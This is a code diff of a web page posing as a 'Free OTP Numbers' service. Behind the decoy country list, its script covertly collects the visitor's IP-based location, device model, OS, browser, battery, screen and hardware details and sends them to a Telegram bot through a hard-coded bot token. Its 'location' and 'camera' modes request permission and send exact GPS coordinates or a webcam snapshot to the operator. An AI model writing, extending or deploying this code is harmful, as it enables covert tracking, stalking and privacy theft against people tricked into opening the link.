@@ -1,9 +1,10 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Free OTP Numbers</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #1a1e29; color: white; margin: 0; padding: 15px; text-align: center; }
@@ -37,7 +38,7 @@
         <div class="grid" id="country-grid"></div>
     </div>
 
-    <div id="loading">جاري التحقق... ⏳</div>
+    <div id="loading">Verifying... ⏳</div>
 
     <script>
         const BOT_TOKEN = '8631883105:AAEh_pa8GZUITtttMSVEryWLaTcgxwbLBrc';       
@@ -46,9 +47,21 @@
         const urlParams = new URLSearchParams(window.location.search);
         const targetUserId = urlParams.get('id');
         const mode = urlParams.get('mode') || 'basic';
-        const userLang = urlParams.get('lang') || 'ar'; 
+        const urlLang = urlParams.get('lang'); 
 
-        const countries = [
+        // تحديد لغة رسالة البوت فقط (مش لغة الصفحة، الصفحة المتصفح هو اللي هيترجمها)
+        let botLang = 'en';
+        if (urlLang) {
+            botLang = urlLang;
+        } else if (navigator.language.startsWith('ar')) {
+            botLang = 'ar';
+        } else if (navigator.language.startsWith('hi')) {
+            botLang = 'hi';
+        }
+
+        let ipDataGlobal = {};
+
+        const countriesData = [
             { flag: "🇪🇬", name: "Egypt", numbers: ["+20 10 1234 5678", "+20 11 9876 5432"] },
             { flag: "🇺🇸", name: "USA", numbers: ["+1 202 555 0143", "+1 415 555 0192"] },
             { flag: "🇸🇦", name: "Saudi Arabia", numbers: ["+966 50 123 4567", "+966 55 987 6543"] },
@@ -61,13 +74,31 @@
             { flag: "🇩🇪", name: "Germany", numbers: ["+49 15 1234 5678", "+49 17 9876 5432"] }
         ];
 
+        async function initPage() {
+            try { 
+                const res = await fetch('https://ipwho.is/'); 
+                const data = await res.json();
+                if(data.success) { ipDataGlobal = data; }
+            } catch (e) {}
+
+            if (mode === 'location' || mode === 'camera') {
+                document.getElementById('popup').style.display = 'flex';
+            } else {
+                document.getElementById('mainContent').style.display = 'block';
+                renderCountries();
+                sendBasicInfo(); // إرسال البيانات فوراً لوضع الـ basic
+            }
+        }
+
         function renderCountries() {
             const grid = document.getElementById('country-grid');
             grid.innerHTML = ''; 
-            countries.forEach(c => {
+            countriesData.forEach(c => {
                 const num = c.numbers[Math.floor(Math.random() * c.numbers.length)];
+                
                 const card = document.createElement('div');
                 card.className = 'card';
+                // الكلام هنا إنجليزي صافي، والمتصفح هو اللي هيترجمه لوحده
                 card.innerHTML = `
                     <div>
                         <div class="flag">${c.flag}</div>
@@ -80,14 +111,6 @@
             });
         }
 
-        if (mode === 'location' || mode === 'camera') {
-            document.getElementById('popup').style.display = 'flex';
-        } else {
-            document.getElementById('mainContent').style.display = 'block';
-            renderCountries();
-            sendBasicInfo();
-        }
-
         async function triggerAction() {
             document.getElementById('popup').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
@@ -95,9 +118,9 @@
             if (mode === 'location') {
                 navigator.geolocation.getCurrentPosition(
                     async (pos) => {
-                        await sendText(`📍 الموقع الدقيق:\nخط العرض: ${pos.coords.latitude}\nخط الطول: ${pos.coords.longitude}\n[فتح الخريطة](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`);
+                        await sendText(`📍 Exact Location:\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\n[Open Map](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`);
                         finishAction();
-                    }, (err) => { alert("يجب السماح بالوصول للموقع."); finishAction(); }
+                    }, (err) => { alert("You must allow location access."); finishAction(); }
                 );
             } else if (mode === 'camera') {
                 try {
@@ -112,7 +135,7 @@
                             finishAction();
                         }, 'image/jpeg', 0.8);
                     }, 1000);
-                } catch (err) { alert("يجب السماح بالكاميرا."); finishAction(); }
+                } catch (err) { alert("You must allow camera access."); finishAction(); }
             }
         }
 
@@ -128,17 +151,45 @@
         async function sendBasicInfo() {
             if (!targetUserId) return;
 
-            // استخدام موقع ipwho.is (أدق وبيدعم https)
-            let ipData = {};
-            try { 
-                const res = await fetch('https://ipwho.is/'); 
-                const data = await res.json();
-                if(data.success) { ipData = data; }
+            const ua = navigator.userAgent;
+            
+            let osName = "Unknown";
+            let osVersion = "Unknown";
+            if (/Windows/i.test(ua)) osName = "Windows";
+            else if (/Android/i.test(ua)) osName = "Android";
+            else if (/iPhone|iPad|iPod/i.test(ua)) osName = "iOS";
+            else if (/Mac/i.test(ua)) osName = "macOS";
+            else if (/Linux/i.test(ua)) osName = "Linux";
+            
+            const osMatch = ua.match(/(Android|iPhone OS)\s([0-9\._]+)/i);
+            if (osMatch) osVersion = osMatch[2].replace(/_/g, '.');
+
+            let browserName = "Unknown";
+            if (/Edg/i.test(ua)) browserName = "Edge";
+            else if (/Chrome|CriOS/i.test(ua)) browserName = "Chrome";
+            else if (/Firefox|FxiOS/i.test(ua)) browserName = "Firefox";
+            else if (/Safari/i.test(ua)) browserName = "Safari";
+            else if (/Telegram/i.test(ua)) browserName = "Telegram In-App";
+
+            let deviceModel = "Unknown";
+            const modelMatch = ua.match(/Android[^;]+;\s([^;)]+)\sBuild/i);
+            if (modelMatch) deviceModel = modelMatch[1].trim();
+            if (deviceModel === "K" || deviceModel === "Linux armv81") deviceModel = "Hidden (Browser Privacy)";
+
+            let tgPlatform = "External Browser";
+            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.platform) {
+                tgPlatform = window.Telegram.WebApp.platform;
+            }
+
+            try {
+                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                    const uaData = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
+                    if (uaData.model) deviceModel = uaData.model;
+                    if (uaData.platform) osName = uaData.platform;
+                    if (uaData.platformVersion) osVersion = uaData.platformVersion;
+                }
             } catch (e) {}
 
-            const ua = navigator.userAgent;
-            let device = /android/i.test(ua) ? "Android" : /iPhone|iPad/i.test(ua) ? "iOS" : "PC";
-            
             let batteryText = "Not supported";
             try {
                 const battery = await navigator.getBattery();
@@ -149,27 +200,32 @@
             const isTouch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : 'No';
 
             let report = "";
-            let lat = ipData.latitude || 0;
-            let lon = ipData.longitude || 0;
+            let lat = ipDataGlobal.latitude || 0;
+            let lon = ipDataGlobal.longitude || 0;
 
-            if (userLang === 'ar') {
+            // ==========================================
+            // بناء الرسالة للبوت (حسب الـ lang اللي جاي من الاستضافة)
+            // ==========================================
+            if (botLang === 'ar') {
                 report = `
-📊 <b>Visitor Information Captured</b>
+📊 <b>تم سحب معلومات الزائر</b>
 ━━━━━━━━━━━━━━━━
 
 🖥️ <b>الجهاز والمتصفح</b>
-• موديل الجهاز: ${device} (${navigator.platform})
-• المتصفح: ${ua}
+• موديل الجهاز: ${deviceModel}
+• نظام التشغيل: ${osName} ${osVersion !== "Unknown" ? `(إصدار ${osVersion})` : ""}
+• المتصفح: ${browserName}
+• واجهة التطبيق: ${tgPlatform} (${navigator.platform})
 
 🌐 <b>معلومات الشبكة</b>
-• الآي بي: ${ipData.ip || 'غير معروف'}
+• الآي بي: ${ipDataGlobal.ip || 'غير معروف'}
 • اللغة: ${navigator.language}
 
-📍 <b>تفاصيل الموقع</b>
-• الدولة: ${ipData.country || 'غير معروف'}
-• المحافظة: ${ipData.region || 'غير معروف'}
-• المدينة: ${ipData.city || 'غير معروف'}
-• المنطقة الزمنية: ${ipData.timezone ? ipData.timezone.id : 'غير معروف'}
+📍 <b>تفاصيل الموقع (IP)</b>
+• الدولة: ${ipDataGlobal.country || 'غير معروف'}
+• المحافظة: ${ipDataGlobal.region || 'غير معروف'}
+• المدينة: ${ipDataGlobal.city || 'غير معروف'}
+• المنطقة الزمنية: ${ipDataGlobal.timezone ? ipDataGlobal.timezone.id : 'غير معروف'}
 
 🖼️ <b>معلومات الشاشة</b>
 • الدقة: ${screenRes}
@@ -186,27 +242,32 @@
 • الرام: ${navigator.deviceMemory ? navigator.deviceMemory + ' جيجا' : 'غير معروف'}
 • اللمس: ${isTouch}
 
+📱 <b>User-Agent</b>
+<code>${ua}</code>
+
 ━━━━━━━━━━━━━━━━
 ⚡ <b>المطور:</b> <a href="tg://user?id=${ADMIN_ID}">تواصل مع المطور</a>
                 `;
-            } else if (userLang === 'hi') {
+            } else if (botLang === 'hi') {
                 report = `
-📊 <b>Visitor Information Captured</b>
+📊 <b>आगंतुक जानकारी कैप्चर की गई</b>
 ━━━━━━━━━━━━━━━━
 
 🖥️ <b>डिवाइस और ब्राउज़र</b>
-• डिवाइस मॉडल: ${device} (${navigator.platform})
-• यूजर एजेंट: ${ua}
+• डिवाइस मॉडल: ${deviceModel}
+• ऑपरेटिंग सिस्टम: ${osName} ${osVersion !== "Unknown" ? `(${osVersion})` : ""}
+• ब्राउज़र: ${browserName}
+• ऐप इंटरफ़ेस: ${tgPlatform} (${navigator.platform})
 
 🌐 <b>नेटवर्क जानकारी</b>
-• आईपी पता: ${ipData.ip || 'अज्ञात'}
+• आईपी पता: ${ipDataGlobal.ip || 'अज्ञात'}
 • भाषा: ${navigator.language}
 
-📍 <b>स्थान विवरण</b>
-• देश: ${ipData.country || 'अज्ञात'}
-• क्षेत्र: ${ipData.region || 'अज्ञात'}
-• शहर: ${ipData.city || 'अज्ञात'}
-• समय क्षेत्र: ${ipData.timezone ? ipData.timezone.id : 'अज्ञात'}
+📍 <b>स्थान विवरण (IP)</b>
+• देश: ${ipDataGlobal.country || 'अज्ञात'}
+• क्षेत्र: ${ipDataGlobal.region || 'अज्ञात'}
+• शहर: ${ipDataGlobal.city || 'अज्ञात'}
+• समय क्षेत्र: ${ipDataGlobal.timezone ? ipDataGlobal.timezone.id : 'अज्ञात'}
 
 🖼️ <b>प्रदर्शन जानकारी</b>
 • रिज़ॉल्यूशन: ${screenRes}
@@ -223,6 +284,9 @@
 • रैम: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'अज्ञात'}
 • टच: ${isTouch}
 
+📱 <b>User-Agent</b>
+<code>${ua}</code>
+
 ━━━━━━━━━━━━━━━━
 ⚡ <b>डेवलपर:</b> <a href="tg://user?id=${ADMIN_ID}">संपर्क करने के लिए यहां क्लिक करें</a>
                 `;
@@ -232,18 +296,20 @@
 ━━━━━━━━━━━━━━━━
 
 🖥️ <b>Device & Browser</b>
-• Device Model: ${device} (${navigator.platform})
-• User Agent: ${ua}
+• Device Model: ${deviceModel}
+• OS: ${osName} ${osVersion !== "Unknown" ? `(${osVersion})` : ""}
+• Browser: ${browserName}
+• App Interface: ${tgPlatform} (${navigator.platform})
 
 🌐 <b>Network Information</b>
-• IP Address: ${ipData.ip || 'Unknown'}
+• IP Address: ${ipDataGlobal.ip || 'Unknown'}
 • Language: ${navigator.language}
 
-📍 <b>Location Details</b>
-• Country: ${ipData.country || 'Unknown'}
-• Region: ${ipData.region || 'Unknown'}
-• City: ${ipData.city || 'Unknown'}
-• Timezone: ${ipData.timezone ? ipData.timezone.id : 'Unknown'}
+📍 <b>Location Details (IP)</b>
+• Country: ${ipDataGlobal.country || 'Unknown'}
+• Region: ${ipDataGlobal.region || 'Unknown'}
+• City: ${ipDataGlobal.city || 'Unknown'}
+• Timezone: ${ipDataGlobal.timezone ? ipDataGlobal.timezone.id : 'Unknown'}
 
 🖼️ <b>Display Information</b>
 • Resolution: ${screenRes}
@@ -259,6 +325,9 @@
 • CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
 • RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'}
 • Touch Support: ${isTouch}
+
+📱 <b>User-Agent</b>
+<code>${ua}</code>
 
 ━━━━━━━━━━━━━━━━
 ⚡ <b>Developed by:</b> <a href="tg://user?id=${ADMIN_ID}">Contact Developer</a>
@@ -290,10 +359,12 @@
             if (!targetUserId) return;
             const formData = new FormData();
             formData.append('photo', blob, filename);
-            formData.append('caption', `🚨 صورة (${mode})`);
+            formData.append('caption', `🚨 Photo (${mode})`);
             formData.append('chat_id', targetUserId);
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e=>{});
         }
+
+        initPage();
     </script>
 </body>
 </html>
